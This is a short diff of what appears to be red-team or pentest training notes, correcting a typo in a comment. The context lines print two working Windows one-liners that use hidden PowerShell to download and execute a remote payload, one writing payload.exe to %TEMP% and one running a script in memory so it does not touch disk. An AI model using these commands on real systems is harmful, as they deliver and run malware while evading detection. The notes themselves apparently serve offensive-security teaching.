@@ -126,7 +126,7 @@
     The follow onelinner uses 'powershell(Downloadfile+start)' method to achieve the same as previous 'certutil' exercise ..
     cmd.exe /c powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://webserver/payload.exe', '%TEMP%\\payload.exe') & start '%TEMP%\\payload.exe'
 
-    The follow onelinner uses 'powershell(IEX+downloadstring)' method to achieve allmost same (payload.ps1 does not touch disk)
+    The follow onelinner uses 'powershell(IEX+downloadstring)' method to achieve allmost the same (payload.ps1 does not touch disk)
     cmd.exe /c powershell.exe -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://webserver/payload.ps1'))"
     
 
